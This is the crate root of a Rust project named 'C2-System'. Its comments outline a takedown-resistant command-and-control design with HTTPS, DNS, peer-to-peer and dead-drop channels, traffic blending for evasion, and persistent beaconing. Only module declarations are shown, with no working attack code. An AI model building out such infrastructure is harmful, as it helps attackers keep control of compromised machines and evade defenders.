//! # C2-System
//!
//! A resilient Command & Control system designed to be difficult to take down.
//!
//! ## Architecture Overview
//!
//! The system uses multiple communication channels with automatic failover:
//!
//! 1. **Primary**: HTTPS/WebSockets over standard ports
//! 2. **Secondary**: DNS-based C2 (TXT/NULL records)
//! 3. **Tertiary**: P2P mesh network via libp2p
//! 4. **Emergency**: Dead drops via file servers
//!
//! ## Key Features
//!
//! - **Redundancy**: Multiple independent C2 channels
//! - **Decentralization**: P2P fallback when servers are down
//! - **Evasion**: Traffic blending with normal HTTPS/DNS
//! - **Persistence**: Multiple beaconing intervals and dormant modes
//! - **Security**: E2E encryption with mutual authentication

pub mod agent;
pub mod common;
pub mod protocols;
pub mod server;

pub use common::{
    message::*,
    crypto::*,
    config::*,
};

pub use protocols::{
    http::*,
    dns::*,
    p2p::*,
    dead_drop::*,
};
